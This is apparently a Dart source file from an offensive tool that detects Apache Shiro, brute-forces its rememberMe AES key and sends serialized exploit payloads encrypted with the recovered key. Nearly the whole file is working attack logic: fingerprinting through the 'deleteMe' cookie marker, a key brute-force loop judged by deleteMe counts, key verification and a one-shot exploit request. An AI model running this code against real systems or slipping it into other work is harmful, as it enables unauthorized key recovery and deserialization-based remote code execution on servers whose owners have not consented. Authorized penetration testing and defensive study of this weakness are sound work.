import 'dart:typed_data';

import 'package:http/http.dart' as http;

import 'shiro_crypto.dart';

/// Shiro 利用核心逻辑（检测 / 爆破），与 UI 解耦。
class ShiroExpService {
  final Uri target;
  final String method;
  final String cookieName;
  final Duration timeout;
  final ShiroCrypto crypto;

  ShiroExpService({
    required String url,
    this.method = 'GET',
    this.cookieName = 'rememberMe',
    this.timeout = const Duration(seconds: 10),
    ShiroCrypto? crypto,
  }) : target = Uri.parse(url),
       crypto = crypto ?? const ShiroCrypto();

  /// 检测目标是否使用 Shiro（通过 deleteMe 标记）。
  Future<bool> checkIsShiro() async {
    final client = http.Client();
    try {
      // ShiroAttack 探测逻辑：发送 cookieName=yes
      final res1 = await _send('yes', client: client);
      final c1 = _countDeleteMe(res1);
      if (c1 > 0) return true;

      // 再次确认：发送随机值
      final rnd = _randomString(10);
      final res2 = await _send(rnd, client: client);
      final c2 = _countDeleteMe(res2);
      return c2 > 0;
    } finally {
      client.close();
    }
  }

  /// 统计响应中 deleteMe 的出现次数
  /// 对齐 ShiroAttack 逻辑：在整个响应文本（Header + Body）中搜索 "deleteMe"
  int _countDeleteMe(http.Response res) {
    final fullText = StringBuffer()
      ..write(res.headers.toString())
      ..write(res.body);
    // 为兼容不同大小写形式（deleteMe / DeleteMe / DELETEME），统一转为小写统计
    final s = fullText.toString().toLowerCase();

    int count = 0;
    int idx = s.indexOf('deleteme');
    while (idx != -1) {
      count++;
      idx = s.indexOf('deleteme', idx + 8);
    }
    return count;
  }

  /// 发送带 Shiro Cookie 的请求
  /// 关键调整：
  /// 1. 禁止重定向 (FollowRedirects = false)
  /// 2. 不对 Cookie 值进行 URL 编码 (对齐 ShiroAttack)
  /// 3. 补全特定的浏览器 Header
  Future<http.Response> _send(
    String cookieValue, {
    http.Client? client,
  }) async {
    final c = client ?? http.Client();
    try {
      final finalCookie = '$cookieName=$cookieValue';
      final headers = <String, String>{
        'Cookie': finalCookie,
        'Accept':
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'close',
        'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
      };
      final request = http.Request(method.toUpperCase(), target)
        ..followRedirects = false
        ..headers.addAll(headers);

      final streamedRes = await c.send(request).timeout(timeout);
      final response = await http.Response.fromStream(streamedRes);
      return response;
    } finally {
      if (client == null) c.close();
    }
  }

  /// 密钥爆破算法：与 ShiroAttack 4.7.0 行为高度一致
  Future<String?> bruteForceKey({
    required List<String> candidateKeysBase64,
    required List<int> serializedPayload,
    ShiroEncryptionMode mode = ShiroEncryptionMode.cbc,
    void Function(String log)? onProgress,
    bool verbose = false,
  }) async {
    if (candidateKeysBase64.isEmpty) return null;
    final client = http.Client();
    try {
      // 1. 获取基线（使用无效随机 Cookie）
      final baselineRes = await _send(_randomString(16), client: client);
      final baselineCount = _countDeleteMe(baselineRes);
      final baselineSetCookie =
          (baselineRes.headers['set-cookie'] ?? '').toLowerCase();
      final baselineHasDeleteMe =
          baselineSetCookie.contains('${cookieName.toLowerCase()}=deleteme');

      onProgress?.call(
        '[i] 模式: ${mode.name.toUpperCase()}, 基线 deleteMe: $baselineCount, HTTP: ${baselineRes.statusCode}',
      );

      if (!baselineHasDeleteMe) {
        onProgress?.call(
            '[!] 警告：基线响应中未发现 ${cookieName}=deleteMe，目标可能未启用 Shiro rememberMe 或当前 URL 未触发 rememberMe 逻辑');
      }

      int count = 0;
      final total = candidateKeysBase64.length;
      for (final key in candidateKeysBase64) {
        count++;
        try {
          // 2. 加密 Payload (不带 URL 编码)
          final encryptedB64 = await crypto.encryptRememberMe(
            keyBase64: key,
            serializedPayload: Uint8List.fromList(serializedPayload),
            mode: mode,
          );

          // 3. 发送请求并统计
          final res = await _send(encryptedB64, client: client);
          final curCount = _countDeleteMe(res);

          if (count == 1 || count % 10 == 0) {
            onProgress?.call(
              '[D] 正在尝试 ($count/$total): $key (Status=${res.statusCode}, deleteMe=$curCount)',
            );
          }

          // 与 Ares-X/shiro-exploit 对齐的判定方式：
          // 只要 Set-Cookie 里 deleteMe 的数量减少了，就认为解密成功。
          if (curCount < baselineCount) {
            onProgress?.call('[+] 爆破成功！在第 $count 个处找到密钥: $key');
            return key;
          }
        } catch (e) {
          if (verbose) onProgress?.call('[-] $key 异常: $e');
        }

        if (verbose) {
          onProgress?.call('[*] 测试 ($count): $key');
        } else if (count % 100 == 0) {
          onProgress?.call('[*] 已尝试 $count 个 key...');
        }
      }
      onProgress?.call('[!] 遍历结束，未找到正确密钥');
      return null;
    } finally {
      client.close();
    }
  }

  /// 验证 Key 是否有效（发送 principal payload，检查 deleteMe 是否减少）
  Future<bool> verifyKey({
    required String keyBase64,
    required List<int> serializedPayload,
    ShiroEncryptionMode mode = ShiroEncryptionMode.cbc,
    void Function(String log)? onProgress,
  }) async {
    final client = http.Client();
    try {
      final baselineRes = await _send(_randomString(16), client: client);
      final baselineCount = _countDeleteMe(baselineRes);

      final encryptedB64 = await crypto.encryptRememberMe(
        keyBase64: keyBase64,
        serializedPayload: Uint8List.fromList(serializedPayload),
        mode: mode,
      );
      final res = await _send(encryptedB64, client: client);
      final curCount = _countDeleteMe(res);

      onProgress?.call(
        '[i] 基线 deleteMe: $baselineCount, 当前 deleteMe: $curCount',
      );
      return curCount < baselineCount;
    } finally {
      client.close();
    }
  }

  /// 使用已知 Key 和给定 Payload 发送一次利用请求
  Future<http.Response> sendExploitOnce({
    required String keyBase64,
    required List<int> serializedPayload,
    ShiroEncryptionMode mode = ShiroEncryptionMode.cbc,
    void Function(String log)? onProgress,
  }) async {
    onProgress?.call('[*] 使用指定 Key 发送一次利用请求...');
    final encryptedB64 = await crypto.encryptRememberMe(
      keyBase64: keyBase64,
      serializedPayload: Uint8List.fromList(serializedPayload),
      mode: mode,
    );
    final res = await _send(encryptedB64);
    onProgress?.call(
      '[+] 利用请求已发送，HTTP: ${res.statusCode}, deleteMe: ${_countDeleteMe(res)}',
    );
    return res;
  }

  static String _randomString(int length) {
    const chars =
        'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    final rnd = DateTime.now().microsecondsSinceEpoch;
    final codeUnits = List<int>.generate(length, (i) {
      final index = (rnd + i * 31) % chars.length;
      return chars.codeUnitAt(index);
    });
    return String.fromCharCodes(codeUnits);
  }
}
